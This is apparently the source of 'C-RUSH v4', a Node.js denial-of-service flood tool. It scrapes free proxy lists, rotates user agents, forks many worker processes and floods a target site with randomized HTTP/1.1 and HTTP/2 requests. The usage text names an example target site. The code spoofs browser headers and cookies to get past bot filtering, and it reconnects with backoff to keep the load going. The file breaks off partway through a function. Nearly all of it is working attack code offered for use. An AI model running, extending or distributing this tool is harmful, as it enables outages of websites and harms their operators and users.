#!/usr/bin/env node
/**
 * C-RUSH v4 — Auto-Proxy · Auto-UA · Watchdog · Live Stats
 * @spiderxcode
 *
 *   node c-rush.js <target> <duration> [port|proxy.txt] [threads] [rate] [opts]
 *
 * v4 highlights:
 *  - Zero-config: auto-download proxies from 20+ sources if none given
 *  - Auto-download UA lists from remote, fallback to built-in
 *  - Per-connection watchdog kills half-open sockets, forces reconnect
 *  - Live single-line stats (\r + clear-to-EOL), no more burst lines
 *  - HPACK reset per reconnect (fixes corruption after partial write)
 *  - Exponential backoff on GOAWAY to prevent reconnect storm
 *  - Master pre-scrapes so all workers share validated pool
 */

'use strict';

const net      = require('net');
const tls      = require('tls');
const fs       = require('fs');
const path     = require('path');
const crypto   = require('crypto');
const cluster  = require('cluster');
const HPACK    = require('hpack');
const colors   = require('colors');
const setTitle = require('node-bash-title');
const httpx    = require('axios');
const { performance } = require('perf_hooks');

/* ================================================================== *
 *  CONSTANTS
 * ================================================================== */
const PROXY_SOURCES = [
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/https.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/https.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt',
    'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/prxchk/proxy-list/main/https.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt',
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all',
    'https://proxyspace.pro/http.txt',
    'https://proxyspace.pro/https.txt',
    'https://www.proxy-list.download/api/v1/get?type=http',
    'https://www.proxy-list.download/api/v1/get?type=https',
    'https://www.proxyscan.io/download?type=http',
    'https://www.proxyscan.io/download?type=https'
];

const UA_SOURCES = [
    'https://raw.githubusercontent.com/intoli/user-agents/master/src/user-agents.json',
    'https://raw.githubusercontent.com/fake-useragent/fake-useragent/master/src/fake_useragent/data/browsers.json'
];

const BUILTIN_UA = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
];

const ignoreNames = new Set([
    'RequestError','StatusCodeError','CaptchaError','CloudflareError','ParseError',
    'ParserError','TimeoutError','JSONError','URLError','InvalidURL','ProxyError',
    'DeprecationWarning','FetchError','SocketError'
]);
const ignoreCodes = new Set([
    'SELF_SIGNED_CERT_IN_CHAIN','ECONNRESET','ERR_ASSERTION','ECONNREFUSED','EPIPE',
    'EHOSTUNREACH','ETIMEDOUT','ESOCKETTIMEDOUT','EPROTO','EAI_AGAIN','EHOSTDOWN',
    'ENETRESET','ENETUNREACH','ENOTCONN','ENOTFOUND','EAI_NODATA','EAI_NONAME',
    'EADDRNOTAVAIL','EAFNOSUPPORT','EALREADY','EBADF','ECONNABORTED','EDESTADDRREQ',
    'EDQUOT','EFAULT','EIDRM','EILSEQ','EINPROGRESS','EINTR','EINVAL','EIO','EISCONN',
    'EMFILE','EMLINK','EMSGSIZE','ENAMETOOLONG','ENETDOWN','ENOBUFS','ENODEV','ENOENT',
    'ENOMEM','ENOPROTOOPT','ENOSPC','ENOSYS','ENOTDIR','ENOTEMPTY','ENOTSOCK',
    'EOPNOTSUPP','EPERM','EPROTONOSUPPORT','ERANGE','EROFS','ESHUTDOWN','ESPIPE',
    'ESRCH','ETIME','ETXTBSY','EXDEV','UNKNOWN','DEPTH_ZERO_SELF_SIGNED_CERT',
    'UNABLE_TO_VERIFY_LEAF_SIGNATURE','CERT_HAS_EXPIRED','CERT_NOT_YET_VALID',
    'ERR_SOCKET_BAD_PORT','ERR_TLS_CERT_ALTNAME_INVALID','ERR_SSL_WRONG_VERSION_NUMBER',
    'HPE_INVALID_METHOD','HPE_INVALID_URL','ERR_STREAM_WRITE_AFTER_END',
    'ERR_STREAM_DESTROYED','ERR_HTTP2_STREAM_ERROR','ERR_HTTP2_GOAWAY_SESSION'
]);

/* ================================================================== *
 *  HELPERS
 * ================================================================== */
const pick    = a => a[(Math.random() * a.length) | 0];
const randHex = n => crypto.randomBytes(n).toString('hex');
const sleep   = ms => new Promise(r => setTimeout(r, ms));

/* ================================================================== *
 *  ARGS
 * ================================================================== */
const args = process.argv.slice(2);
const has  = f => args.includes(f);
const get  = (f, d) => { const i = args.indexOf(f); return i === -1 ? d : args[i + 1]; };

if (args[0] === 'scrape') { scrapeOnly(); }
if (args.length < 2) { banner(); usage(); process.exit(1); }

const target   = args[0];
const duration = parseInt(args[1]);
const third    = args[2] || '';
const threads  = parseInt(args[3] || '200');
const rate     = parseInt(args[4] || '32');

let port = 443, proxyFile = null;
if (/^\d+$/.test(third)) port = parseInt(third);
else if (third && fs.existsSync(third)) proxyFile = third;
else if (third && !/^\d+$/.test(third)) port = 443;

let url;
try { url = new URL(target); } catch { console.log(colors.red('bad target url')); process.exit(1); }

const options = {
    cookies:   has('-c'),
    headfull:  has('-h'),
    direct:    has('--direct'),
    noProbe:   has('--no-probe'),
    verbose:   has('--verbose'),
    version:   get('-v', '2'),
    cache:     get('-ch', 'true') !== 'false',
    debug:     !has('-s'),
    jitter:    parseFloat(get('-j', '0.2')),
    streamTo:  parseInt(get('-k', '30000')),
    connectTo: parseInt(get('-t', '5000')),
    parallel:  parseInt(get('-p', '8'))
};

/* ================================================================== *
 *  MISC SETUP
 * ================================================================== */
require('events').EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);
process.emitWarning = () => {};

for (const ev of ['uncaughtException', 'unhandledRejection', 'warning']) {
    process.on(ev, e => {
        if (!e) return;
        if (ignoreCodes.has(e.code) || ignoreNames.has(e.name)) return;
        if (options.verbose) console.log(colors.yellow(`${ev}: ${e.message || e}`));
    });
}
process.on('SIGHUP', () => {});
process.on('SIGCHLD', () => {});

/* ================================================================== *
 *  BANNER / USAGE
 * ================================================================== */
function banner() {
    console.log(colors.red(`
   ______   ____  __  __ _____  _    _
  / ____/  / __ \\/ / / // ___/ | |  | |
 / /      / /_/ / / / / \\__ \\  | |__| |
/ /___   / _, _/ /_/ / ___/ /  |  __  |
\\____/  /_/ |_|\\____/ /____/   |_|  |_|

   ${colors.gray('H1 & H2 Mixed RushAway · Auto-Proxy · Auto-UA · v4')}
   ${colors.gray('engine by')} ${colors.green('@spiderxcode')}
`));
}

function usage() {
    console.log(colors.gray(`
Usage:
  node c-rush.js <target> <duration> [port|proxy.txt] [threads] [rate] [opts]
  node c-rush.js scrape

Zero-config examples:
  node c-rush.js https://bestcheatir.com 120 443
  node c-rush.js https://bestcheatir.com 120 443 200 32 -c -h -v 2

Options:
  -c           random cookies
  -h           headfull / sec-ch-ua
  -v <1|2>     http version (default 2)
  -ch <t|f>    cache-control (default true)
  -s           silent
  -j <0-1>     jitter (default 0.2)
  -t <ms>      CONNECT timeout (default 5000)
  -k <ms>      stream keepalive (default 30000)
  -p <n>       parallel conns/worker (default 8)
  --direct     skip proxies
  --no-probe   skip proxy probe
  --verbose    per-conn error logs
`));
}

/* ================================================================== *
 *  SCRAPE (standalone)
 * ================================================================== */
async function scrapeOnly() {
    console.clear(); banner();
    console.log(colors.gray('scraping proxies...\n'));
    await downloadProxies('proxy.txt');
    console.log(colors.green('\ndone -> proxy.txt'));
    process.exit(0);
}

/* ================================================================== *
 *  PROXY DOWNLOAD
 * ================================================================== */
async function downloadProxies(outFile) {
    const chunks = [];
    let i = 0;
    for (const src of PROXY_SOURCES) {
        i++;
        process.stdout.write(`\r${colors.gray(`[${i}/${PROXY_SOURCES.length}]`)} ${src.split('/')[2].slice(0, 30).padEnd(30)}`);
        try {
            const res = await httpx.get(src, { timeout: 8000, headers: { 'User-Agent': pick(BUILTIN_UA) } });
            chunks.push(res.data.toString());
        } catch {}
    }
    const all = chunks.join('\n')
        .split('\n').map(l => l.trim())
        .filter(l => /^\d{1,3}(\.\d{1,3}){3}:\d+$/.test(l));
    const uniq = [...new Set(all)];
    fs.writeFileSync(outFile, uniq.join('\n') + '\n');
    process.stdout.write('\r' + ' '.repeat(100) + '\r');
    return uniq.length;
}

/* ================================================================== *
 *  UA DOWNLOAD
 * ================================================================== */
async function downloadUAs(outFile) {
    const uas = new Set(BUILTIN_UA);
    for (const src of UA_SOURCES) {
        try {
            const res = await httpx.get(src, { timeout: 10000 });
            const data = res.data;
            if (src.includes('intoli')) {
                if (Array.isArray(data)) {
                    for (const item of data) if (item.userAgent) uas.add(item.userAgent);
                }
            } else if (src.includes('fake-useragent')) {
                if (data && data.browsers) {
                    for (const list of Object.values(data.browsers))
                        for (const ua of list) uas.add(ua);
                }
            }
        } catch {}
    }
    fs.writeFileSync(outFile, [...uas].join('\n') + '\n');
    return uas.size;
}

/* ================================================================== *
 *  PROBE
 * ================================================================== */
function probeProxy(entry, timeoutMs = 2500) {
    return new Promise(resolve => {
        const [host, port] = entry.split(':');
        if (!port) return resolve(false);
        const s = net.connect({ host, port: Number(port) });
        let done = false;
        const fin = ok => { if (done) return; done = true; try { s.destroy(); } catch {} resolve(ok); };
        const t = setTimeout(() => fin(false), timeoutMs);
        s.once('connect', () => { clearTimeout(t); fin(true); });
        s.once('error',   () => { clearTimeout(t); fin(false); });
        s.once('close',   () => { clearTimeout(t); fin(false); });
    });
}

/* ================================================================== *
 *  H2 FRAMES
 * ================================================================== */
const PREFACE = 'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n';
function encodeFrame(sid, type, payload = Buffer.alloc(0), flags = 0) {
    const len = payload.length;
    const h = Buffer.alloc(9);
    h.writeUIntBE(len, 0, 3);
    h.writeUInt8(type, 3);
    h.writeUInt8(flags, 4);
    h.writeUInt32BE(sid & 0x7fffffff, 5);
    return Buffer.concat([h, payload]);
}
function decodeFrame(buf) {
    if (!buf || buf.length < 9) return null;
    const len  = buf.readUIntBE(0, 3);
    const type = buf.readUInt8(3);
    const flag = buf.readUInt8(4);
    const sid  = buf.readUInt32BE(5) & 0x7fffffff;
    if (buf.length < 9 + len) return null;
    return { len, type, flags: flag, streamId: sid, payload: buf.subarray(9, 9 + len) };
}
function encodeSettings(s) {
    const b = Buffer.alloc(6 * s.length);
    for (let i = 0; i < s.length; i++) {
        b.writeUInt16BE(s[i][0], i * 6);
        b.writeUInt32BE(s[i][1], i * 6 + 2);
    }
    return b;
}
function encodeRst(streamId, code = 0) {
    const p = Buffer.alloc(4); p.writeUInt32BE(code, 0);
    return encodeFrame(streamId, 3, p, 0);
}

/* ================================================================== *
 *  TOKEN BUCKET
 * ================================================================== */
class TokenBucket {
    constructor(rps) {
        this.rps = Math.max(1, rps);
        this.tokens = this.rps;
        this.last = performance.now();
    }
    take() {
        const now = performance.now();
        const dt = (now - this.last) / 1000;
        this.last = now;
        this.tokens = Math.min(this.rps * 2, this.tokens + dt * this.rps);
        if (this.tokens >= 1) { this.tokens -= 1; return true; }
        return false;
    }
    nextWaitMs() {
        if (this.tokens >= 1) return 0;
        return Math.ceil(((1 - this.tokens) / this.rps) * 1000);
    }
}

/* ================================================================== *
 *  MASTER
 * ================================================================== */
const isPrimary = cluster.isPrimary !== undefined ? cluster.isPrimary : cluster.isMaster;

if (isPrimary) {
    (async () => {
        console.clear();
        banner();

        /* ---- 1. get proxies ---- */
        let finalProxies = [];
        if (options.direct) {
            console.log(colors.gray('proxy       : ') + colors.cyan('skipped (--direct)'));
        } else if (proxyFile) {
            console.log(colors.gray('proxy file  : ') + colors.cyan(proxyFile));
            try {
                finalProxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').map(l => l.trim()).filter(Boolean);
            } catch {}
            if (!finalProxies.length) {
                console.log(colors.yellow('empty → auto-scraping'));
                const n = await downloadProxies('proxy.txt');
                finalProxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
            }
        } else {
            console.log(colors.gray('proxy       : ') + colors.cyan('auto-download'));
            const n = await downloadProxies('proxy.txt');
            finalProxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
            console.log(colors.gray('scraped     : ') + colors.green(n + ' raw'));
        }

        /* ---- 2. probe proxies ---- */
        if (!options.direct && !options.noProbe && finalProxies.length) {
            const sample = finalProxies.slice(0, Math.min(300, finalProxies.length));
            process.stdout.write(colors.gray(`\nprobing ${sample.length} proxies `));
            const alive = [];
            let done = 0;
            await Promise.all(sample.map(async p => {
                const ok = await probeProxy(p, 2000);
                if (ok) alive.push(p);
                done++;
                process.stdout.write(`\r${colors.gray(`probing ${done}/${sample.length} → alive ${alive.length}`)}`);
            }));
            process.stdout.write(' '.repeat(40) + '\r');
            if (alive.length < 5) {
                console.log(colors.red(`\nnot enough proxies (${alive.length}) → forcing --direct`));
                options.direct = true;
            } else {
                finalProxies = alive;
                console.log(colors.gray(`\nproxies     : `) + colors.green(alive.length + ' alive'));
            }
        }

        /* ---- 3. UA list ---- */
        process.stdout.write(colors.gray('UAs         : downloading'));
        const uaCount = await downloadUAs('ua.txt');
        process.stdout.write(`\r${colors.gray('UAs         : ')}${colors.green(uaCount + ' loaded')}${' '.repeat(20)}\n`);

        /* ---- 4. header ---- */
        console.log('');
        console.log(colors.gray(`  Target     ${colors.white(':')} ${colors.cyan(target)}`));
        console.log(colors.gray(`  Port       ${colors.white(':')} ${colors.cyan(port)}`));
        console.log(colors.gray(`  Duration   ${colors.white(':')} ${colors.cyan(duration + 's')}`));
        console.log(colors.gray(`  Threads    ${colors.white(':')} ${colors.cyan(threads)}`));
        console.log(colors.gray(`  Rate       ${colors.white(':')} ${colors.cyan(rate + '/s/worker')}`));
        console.log(colors.gray(`  Parallel   ${colors.white(':')} ${colors.cyan(options.parallel + ' conns')}`));
        console.log(colors.gray(`  Protocol   ${colors.white(':')} ${colors.cyan(options.version === '1' ? 'HTTP/1.1' : 'HTTP/2')}`));
        console.log(colors.gray(`  Direct     ${colors.white(':')} ${colors.cyan(options.direct ? 'yes' : 'no')}`));
        console.log('');

        /* ---- 5. pass config to workers ---- */
        process.env.CRUSH_PROXIES  = finalProxies.join('\n');
        process.env.CRUSH_PORT     = String(port);

        /* ---- 6. fork ---- */
        const agg = { attempts: 0, conns: 0, dead: 0, requests: 0, success: 0, forbidden: 0, goaway: 0, errors: 0 };
        let lastRequests = 0, lastTick = performance.now(), rps = 0, elapsed = 0;
        const start = performance.now();
        let shuttingDown = false;
        let lastLine = '';

        const workers = [];
        for (let i = 0; i < threads; i++) {
            const w = cluster.fork({ CRUSH_PROXIES: process.env.CRUSH_PROXIES, CRUSH_PORT: process.env.CRUSH_PORT });
            workers.push(w);
            w.on('message', m => {
                if (!m || m.type !== 'stats') return;
                for (const k in m.delta) agg[k] += m.delta[k];
            });
        }

        /* ---- 7. live render loop (single line) ---- */
        const render = setInterval(() => {
            const now = performance.now();
            const dt = (now - lastTick) / 1000;
            lastTick = now;
            rps = Math.round((agg.requests - lastRequests) / dt);
            lastRequests = agg.requests;
            elapsed = Math.round((now - start) / 1000);
            if (!options.debug) return;
            if (shuttingDown) return;

            const pct = Math.min(100, Math.round((elapsed / duration) * 100));
            const line =
                colors.gray(`[${String(elapsed).padStart(3)}s]`) + ' ' +
                colors.gray(`att=${agg.attempts}`) + ' ' +
                colors.magenta(`conn=${agg.conns}`) + ' ' +
                colors.red(`dead=${agg.dead}`) + ' ' +
                colors.cyan(`req=${agg.requests}`) + ' ' +
                colors.green(`rps=${rps}`) + ' ' +
                colors.yellow(`err=${agg.errors}`) + ' ' +
                colors.red(`goa=${agg.goaway}`) + ' ' +
                colors.gray(`(${pct}%)`);

            setTitle(`C-RUSH v4 · ${agg.requests} req · ${rps} rps · conn ${agg.conns}`);
            process.stdout.write('\r' + line + '\x1b[K');
            lastLine = line;
        }, 1000);

        /* ---- 8. finish ---- */
        const finish = () => {
            if (shuttingDown) return;
            shuttingDown = true;
            clearInterval(render);
            process.stdout.write('\n\n');
            console.log(colors.red('— flood finished —'));
            console.log(colors.gray(`attempts       : ${colors.cyan(agg.attempts)}`));
            console.log(colors.gray(`established    : ${colors.magenta(agg.conns)}`));
            console.log(colors.gray(`dead           : ${colors.red(agg.dead)}`));
            console.log(colors.gray(`total requests : ${colors.cyan(agg.requests)}`));
            console.log(colors.gray(`errors         : ${colors.yellow(agg.errors)}`));
            console.log(colors.gray(`goaway         : ${colors.red(agg.goaway)}`));
            console.log(colors.gray(`avg rps        : ${colors.green(Math.round(agg.requests / Math.max(1, elapsed)))}`));
            for (const w of workers) { try { w.kill('SIGTERM'); } catch {} }
            setTimeout(() => process.exit(0), 400);
        };

        setTimeout(finish, duration * 1000);
        process.on('SIGINT', finish);
    })();
}

/* ================================================================== *
 *  WORKER
 * ================================================================== */
else {
    /* --- config from master --- */
    const proxyStr = process.env.CRUSH_PROXIES || '';
    let proxies = proxyStr.split('\n').filter(Boolean);
    const serverPort = parseInt(process.env.CRUSH_PORT || '443');

    /* --- load UAs --- */
    let UA_POOL = BUILTIN_UA.slice();
    try {
        const uas = fs.readFileSync('ua.txt', 'utf-8').split('\n').map(l => l.trim()).filter(Boolean);
        if (uas.length > 0) UA_POOL = uas;
    } catch {}
    const randUA = () => pick(UA_POOL);

    /* --- bucket & stats --- */
    const bucket = new TokenBucket(rate);
    let pendingDelta = { attempts: 0, conns: 0, dead: 0, requests: 0, success: 0, forbidden: 0, goaway: 0, errors: 0 };
    const bump = k => { pendingDelta[k]++; };
    const flush = () => {
        if (process.send) process.send({ type: 'stats', delta: pendingDelta });
        pendingDelta = { attempts: 0, conns: 0, dead: 0, requests: 0, success: 0, forbidden: 0, goaway: 0, errors: 0 };
    };
    setInterval(flush, 500);
    process.on('SIGTERM', () => { flush(); process.exit(0); });
    process.on('SIGINT',  () => { flush(); process.exit(0); });

    if (options.verbose) console.log(colors.gray(`worker ${process.pid} up · proxies=${proxies.length} · uas=${UA_POOL.length}`));

    /* --- connection health --- */
    let consecutiveGoaway = 0;
    const backoff = () => {
        consecutiveGoaway = Math.min(consecutiveGoaway + 1, 6);
        return Math.min(5000, 200 * Math.pow(2, consecutiveGoaway - 1)) + Math.random() * 500;
    };
    const resetBackoff = () => { consecutiveGoaway = 0; };

    /* --- cookie --- */
    function randCookie() {
        const names  = ['session','user','token','id','auth','pref','theme','lang','consent','tracking','analytics','ab_test'];
        const values = ['abc123','xyz789','def456','temp','guest','user','admin','visitor','test','beta','prod','staging'];
        const parts = [`${pick(names)}=${pick(values)}${randHex(4)}`];
        if (Math.random() > 0.7) parts.push('Path=/');
        if (Math.random() > 0.7) parts.push(`Domain=.${url.hostname}`);
        if (Math.random() > 0.5) parts.push('Secure');
        if (Math.random() > 0.5) parts.push('HttpOnly');
        return parts.join('; ');
    }

    /* --- H1 payload --- */
    function h1Payload() {
        const method = pick(['GET','POST','HEAD','PUT','DELETE']);
        const p = url.pathname + (Math.random() > 0.7 ? `?cb=${randHex(4)}` : '');
        let h = `${method} ${p} HTTP/1.1\r\nHost: ${url.host}\r\n`;
        h += `User-Agent: ${randUA()}\r\n`;
        h += `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n`;
        h += `Accept-Encoding: gzip, deflate, br\r\n`;
        h += `Accept-Language: en-US,en;q=0.9\r\n`;
        h += `Cache-Control: ${options.cache ? 'max-age=0' : 'no-cache'}\r\n`;
        h += `Referer: ${pick(['https://www.google.com/','https://www.bing.com/','https://duckduckgo.com/'])}\r\n`;
        h += `Connection: keep-alive\r\n`;
        if (options.cookies) h += `Cookie: ${randCookie()}\r\n`;
        if (options.headfull) {
            h += `sec-ch-ua: "Chromium";v="120"\r\n`;
            h += `sec-ch-ua-mobile: ?0\r\n`;
            h += `sec-ch-ua-platform: "Windows"\r\n`;
            h += `Sec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\n`;
            h += `Upgrade-Insecure-Requests: 1\r\n`;
        }
        if (method === 'POST' || method === 'PUT') {
            const body = randHex(32);
            h += `Content-Type: application/x-www-form-urlencoded\r\nContent-Length: ${body.length}\r\n\r\n${body}`;
        } else h += `\r\n`;
        return Buffer.from(h, 'binary');
    }

    /* --- connect helper --- */
    function connect(onReady, onFail) {
        bump('attempts');
        let done = false;
        const fail = r => {
            if (done) return; done = true;
            bump('dead');
            if (options.verbose) console.log(colors.yellow(`conn-fail: ${r}`));
            onFail && onFail(r);
        };

        let raw;
        if (options.direct) {
            raw = net.connect({ host: url.hostname, port: serverPort });
        } else {
            const entry = pick(proxies);
            if (!entry) return fail('no proxy');
            const [ph, pp] = entry.split(':');
            if (!pp) return fail('bad proxy');
            raw = net.connect({ host: ph, port: Number(pp) });
        }

        const ct = setTimeout(() => { try { raw.destroy(); } catch {} fail('connect-timeout'); }, options.connectTo);

        raw.once('connect', () => {
            clearTimeout(ct);
            if (options.direct) {
                if (done) return;
                done = true;
                bump('conns');
                return onReady(raw);
            }
            raw.write(`CONNECT ${url.host}:${serverPort} HTTP/1.1\r\nHost: ${url.host}:${serverPort}\r\nProxy-Connection: keep-alive\r\n\r\n`);
            let hbuf = Buffer.alloc(0);
            const onData = chunk => {
                hbuf = Buffer.concat([hbuf, chunk]);
                const idx = hbuf.indexOf('\r\n\r\n');
                if (idx === -1) {
                    if (hbuf.length > 8192) { raw.destroy(); fail('proxy-header-overflow'); }
                    return;
                }
                raw.removeListener('data', onData);
                const head = hbuf.subarray(0, idx).toString('binary');
                if (!/^HTTP\/1\.[01] 200/.test(head)) return fail('proxy-refused:' + head.split('\r\n')[0]);
                if (done) return;
                done = true;
                bump('conns');
                onReady(raw);
            };
            raw.on('data', onData);
        });

        raw.once('error', e => fail('sock-error:' + (e.code || e.message)));
        raw.once('close', () => fail('sock-closed'));
    }

    /* --- H1 open --- */
    function openH1() {
        const reconnect = () => setTimeout(openH1, 150 + Math.random() * 600);
        connect(raw => {
            const t = tls.connect({
                socket: raw, servername: url.hostname, ALPNProtocols: ['http/1.1'],
                rejectUnauthorized: false, minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3'
            }, () => {
                let closed = false;
                let lastSend = performance.now();
                const end = () => {
                    if (closed) return; closed = true;
                    clearInterval(watchdog);
                    try { t.destroy(); } catch {}
                    reconnect();
                };
                const watchdog = setInterval(() => {
                    if (closed || t.destroyed) return clearInterval(watchdog);
                    if (performance.now() - lastSend > options.streamTo) end();
                }, 5000);
                const send = () => {
                    if (closed || t.destroyed) return end();
                    if (!bucket.take()) return setTimeout(send, bucket.nextWaitMs() + 1);
                    t.write(h1Payload(), err => {
                        if (err) { bump('errors'); return end(); }
                        bump('requests');
                        lastSend = performance.now();
                        const w = (1000 / rate) * (1 + (Math.random() * options.jitter * 2 - options.jitter));
                        setTimeout(send, w);
                    });
                };
                send();
                t.on('error', end);
                t.on('close', end);
            });
            t.on('error', () => {});
        }, reconnect);
    }

    /* --- H2 open --- */
    function openH2() {
        const reconnect = () => setTimeout(openH2, 150 + Math.random() * 600);
        connect(raw => {
            const t = tls.connect({
                socket: raw, servername: url.hostname, ALPNProtocols: ['h2', 'http/1.1'],
                rejectUnauthorized: false, minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3',
                secureOptions:
                    crypto.constants.SSL_OP_NO_RENEGOTIATION |
                    crypto.constants.SSL_OP_NO_TICKET |
                    crypto.constants.SSL_OP_NO_COMPRESSION |
                    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION
            }, () => {
                if (t.alpnProtocol !== 'h2') {
                    try { t.destroy(); } catch {}
                    return reconnect();
                }
                resetBackoff();
                runH2(t, reconnect);
            });
            t.on('error', () => {});
        }, reconnect);
    }

    function runH2(t, reconnect) {
        let buf = Buffer.alloc(0);
        let streamId = 1;
        let closed = false;
        let lastSend = performance.now();
        let lastData = performance.now();
        const hpack = new HPACK();
        hpack.setTableSize(4096);

        const close = (reason) => {
            if (closed) return; closed = true;
            clearInterval(watchdog);
            try { t.write(encodeRst(0, 0)); } catch {}
            try { t.destroy(); } catch {}
            const delay = reason === 'goaway' ? backoff() : 150 + Math.random() * 600;
            setTimeout(reconnect, delay);
        };

        /* watchdog — kills half-open sockets that v3 left frozen */
        const watchdog = setInterval(() => {
            if (closed || t.destroyed) return clearInterval(watchdog);
            const now = performance.now();
            if (now - lastSend > options.streamTo) return close('idle-send');
            if (now - lastData > options.streamTo * 2) return close('idle-recv');
        }, 5000);

        t.on('data', d => {
            lastData = performance.now();
            buf = Buffer.concat([buf, d]);
            while (true) {
                const f = decodeFrame(buf);
                if (!f) return;
                buf = buf.subarray(9 + f.len);
                if (f.type === 4 && f.flags === 0) {
                    try { t.write(encodeFrame(0, 4, Buffer.alloc(0), 1)); } catch {}
                }
                if (f.type === 6 && (f.flags & 0x1) === 0) {
                    try { t.write(encodeFrame(0, 6, f.payload, 1)); } catch {}
                }
                if (f.type === 3 && f.payload.length >= 4) {
                    const code = f.payload.readUInt32BE(0);
                    if (code !== 0) bump('errors');
                }
                if (f.type === 7) { bump('goaway'); return close('goaway'); }
                if (f.type === 5) return close('push');
            }
        });
        t.on('error', () => close('err'));
        t.on('close', () => close('closed'));

        const settings = encodeSettings([
            [1, 262144], [2, 0], [3, options.parallel], [4, 6291456], [6, 65535]
        ]);
        const win = Buffer.alloc(4); win.writeUInt32BE(15663105, 0);
        try {
            t.write(Buffer.concat([
                Buffer.from(PREFACE, 'binary'),
                encodeFrame(0, 4, settings, 0),
                encodeFrame(0, 8, win, 0)
            ]));
        } catch { return close('preface'); }

        const send = () => {
            if (closed || t.destroyed) return;
            if (!bucket.take()) return setTimeout(send, bucket.nextWaitMs() + 1);

            const method = pick(['GET','POST','HEAD','PUT','DELETE']);
            const p = url.pathname + (Math.random() > 0.7 ? `?cb=${randHex(4)}` : '');

            const headers = [
                [':method', method],
                [':authority', url.host],
                [':scheme', url.protocol.replace(':', '') || 'https'],
                [':path', p],
                ['user-agent', randUA()],
                ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'],
                ['accept-encoding', 'gzip, deflate, br'],
                ['accept-language', 'en-US,en;q=0.9'],
                ['cache-control', options.cache ? 'max-age=0' : 'no-cache'],
                ['referer', pick(['https://www.google.com/','https://www.bing.com/','https://duckduckgo.com/'])]
            ];
            if (options.cookies) headers.push(['cookie', randCookie()]);
            if (options.headfull) {
                headers.push(
                    ['sec-ch-ua', '"Chromium";v="120"'],
                    ['sec-ch-ua-mobile', '?0'],
                    ['sec-ch-ua-platform', '"Windows"'],
                    ['sec-fetch-dest', 'document'],
                    ['sec-fetch-mode', 'navigate'],
                    ['sec-fetch-site', 'cross-site'],
                    ['sec-fetch-user', '?1'],
                    ['upgrade-insecure-requests', '1']
                );
            }

            let block;
            try {
                const prio = Buffer.from([0x80, 0x00, 0x00, 0x00, 0xFF]);
                block = Buffer.concat([prio, hpack.encode(headers)]);
            } catch {
                bump('errors');
                /* HPACK corrupted → reconnect fresh */
                return close('hpack');
            }

            const isBody = method === 'POST' || method === 'PUT';
            const flags = isBody ? 0x24 : 0x25;
            try {
                t.write(encodeFrame(streamId, 1, block, flags), err => {
                    if (err) { bump('errors'); return close('write'); }
                    bump('requests');
                    lastSend = performance.now();
                });
            } catch { bump('errors'); return close('throw'); }

            if (isBody) {
                try { t.write(encodeFrame(streamId, 0, Buffer.from(randHex(32), 'binary'), 0x01)); } catch {}
            }

            streamId += 2;
            if (streamId > 0x7fffffff) return close('streamid-wrap');

